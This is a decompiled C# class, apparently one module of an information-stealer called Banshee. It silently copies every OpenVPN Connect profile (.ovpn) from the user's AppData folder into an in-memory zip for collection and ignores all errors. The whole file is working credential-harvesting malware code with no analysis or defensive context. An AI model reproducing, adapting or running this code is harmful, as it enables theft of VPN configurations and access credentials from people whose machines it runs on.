﻿using System;
using System.IO;
using System.Threading.Tasks;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000030 RID: 48
	public class OpenVpn : ITarget
	{
		// Token: 0x06000064 RID: 100 RVA: 0x00004218 File Offset: 0x00004218
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect", "profiles");
			if (!Directory.Exists(text))
			{
				return;
			}
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "OpenVPN";
			string targetBase = ZipPath.Vpn("OpenVpn");
			Parallel.ForEach<string>(Directory.GetFiles(text), delegate(string file)
			{
				try
				{
					if (!(Path.GetExtension(file) != ".ovpn"))
					{
						string entryPath = Path.Combine(targetBase, Path.GetFileName(file));
						zip.AddFile(entryPath, File.ReadAllBytes(file));
					}
				}
				catch
				{
				}
			});
			counterApplications.Files.Add(text + " => " + targetBase);
			counterApplications.Files.Add(targetBase + "\\");
			counter.Vpns.Add(counterApplications);
		}
	}
}
